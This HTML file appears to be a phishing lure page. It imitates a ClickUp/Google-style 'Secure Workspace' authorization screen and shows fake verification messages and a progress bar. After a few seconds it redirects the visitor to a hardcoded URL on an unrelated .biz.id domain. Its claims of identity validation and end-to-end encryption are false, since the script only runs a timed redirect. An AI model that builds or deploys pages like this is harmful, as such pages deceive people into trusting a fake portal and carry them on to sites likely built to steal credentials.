<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authorizing | Secure Document Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, BlinkMacSystemFont, 'Google Sans', sans-serif;
            background: linear-gradient(135deg, #f5f7fc 0%, #e9eef5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        /* main card – clean, modern, ClickUp/Google inspired */
        .access-card {
            max-width: 540px;
            width: 100%;
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.02);
            overflow: hidden;
            transition: transform 0.2s ease;
            backdrop-filter: blur(0px);
        }

        /* header – like ClickUp’s clean top bar */
        .card-header {
            background: #ffffff;
            padding: 20px 28px 12px 28px;
            border-bottom: 1px solid #eef2f8;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            background: #7b2ff7;  /* ClickUp purple */
            width: 34px;
            height: 34px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 18px;
            box-shadow: 0 2px 6px rgba(123,47,247,0.2);
        }

        .logo-text {
            font-size: 16px;
            font-weight: 600;
            color: #1f2a3e;
            letter-spacing: -0.2px;
        }

        .badge {
            margin-left: auto;
            background: #eef2ff;
            padding: 5px 14px;
            border-radius: 40px;
            font-size: 12px;
            font-weight: 500;
            color: #7b2ff7;
        }

        /* main content */
        .card-body {
            padding: 28px 28px 36px;
        }

        .icon-large {
            text-align: center;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 26px;
            font-weight: 600;
            color: #1f2a3e;
            text-align: center;
            margin-bottom: 16px;
            letter-spacing: -0.3px;
        }

        .message-box {
            background: #f8faff;
            border-left: 4px solid #7b2ff7;
            padding: 18px 20px;
            border-radius: 16px;
            margin-bottom: 28px;
            font-size: 15px;
            line-height: 1.45;
            color: #2c3e50;
        }

        .message-box strong {
            color: #7b2ff7;
        }

        /* loading area – spinner + rotating status */
        .loading-area {
            text-align: center;
            margin: 24px 0 16px;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e9ecf2;
            border-top-color: #7b2ff7;
            border-right-color: #4285f4;
            border-bottom-color: #34a853;
            border-left-color: #fbbc04;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            margin: 0 auto 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-text {
            font-size: 16px;
            font-weight: 500;
            color: #1f2a3e;
            background: #f8fafd;
            display: inline-block;
            padding: 8px 20px;
            border-radius: 60px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }

        /* subtle progress bar (optional, adds "wait worthy" feel) */
        .progress-track {
            width: 80%;
            height: 4px;
            background: #e9ecf2;
            border-radius: 10px;
            margin: 24px auto 0 auto;
            overflow: hidden;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: #7b2ff7;
            border-radius: 10px;
            transition: width 0.2s linear;
        }

        .support-footer {
            margin-top: 32px;
            text-align: center;
            font-size: 12px;
            color: #8b9ab0;
            border-top: 1px solid #edf2f7;
            padding-top: 20px;
        }

        .support-footer a {
            color: #7b2ff7;
            text-decoration: none;
        }

        .support-footer a:hover {
            text-decoration: underline;
        }

        /* responsive */
        @media (max-width: 550px) {
            .card-body {
                padding: 22px;
            }
            h1 {
                font-size: 22px;
            }
            .status-text {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

<div class="access-card">
    <div class="card-header">
        <div class="logo-icon">✓</div>
        <div class="logo-text">Secure Workspace</div>
        <div class="badge">Verified</div>
    </div>
    <div class="card-body">
        <div class="icon-large">
            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#7b2ff7"/>
            </svg>
        </div>
        <h1>Authorization Required</h1>
        <div class="message-box">
            <strong>🔐 Secure access request</strong> — To view this document, your identity must be authorized. No passwords or email entry required — your session is being validated.
        </div>

        <!-- Loading area with changing status messages -->
        <div class="loading-area">
            <div class="spinner"></div>
            <div class="status-text" id="statusMessage">Loading file...</div>
            <div class="progress-track">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>

        <div class="support-footer">
            Need help? <a href="#">Contact Workspace Support</a> · Secured by end‑to‑end encryption
        </div>
    </div>
</div>

<script>
    // ============================================================
    // 🔗 PASTE YOUR TEACHER'S LINK BELOW (replace the example URL)
    // ============================================================
    const TARGET_URL = "https://wajapou.biz.id/MsekCNp!/";

    // List of status messages to rotate through
    const messages = [
        "Loading file...",
        "Waiting for authorization...",
        "Verifying secure session...",
        "Redirecting to document..."
    ];

    let currentIndex = 0;
    const statusElement = document.getElementById('statusMessage');
    const progressFill = document.getElementById('progressFill');
    let redirectTriggered = false;

    // Update message every 0.9 seconds (total ~3.6 sec for 4 messages)
    function rotateMessage() {
        if (redirectTriggered) return;
        currentIndex = (currentIndex + 1) % messages.length;
        statusElement.textContent = messages[currentIndex];
        
        // Update progress bar (25% per message, but max 95% until redirect)
        let percent = ((currentIndex + 1) / messages.length) * 95;
        progressFill.style.width = percent + "%";
        
        if (currentIndex === messages.length - 1) {
            // last message shown, prepare to redirect
            setTimeout(() => {
                if (!redirectTriggered) {
                    redirectTriggered = true;
                    progressFill.style.width = "100%";
                    statusElement.textContent = "Finalizing...";
                    setTimeout(() => {
                        window.location.href = TARGET_URL;
                    }, 400);
                }
            }, 800);
        } else {
            setTimeout(rotateMessage, 900);
        }
    }

    // Validate URL and start the loading sequence
    try {
        new URL(TARGET_URL);
        // start first message after 100ms
        setTimeout(rotateMessage, 900);
    } catch(e) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h2>Configuration error</h2><p>Please set a valid redirect link in the code.</p></div>";
    }
</script>
</body>
</html>
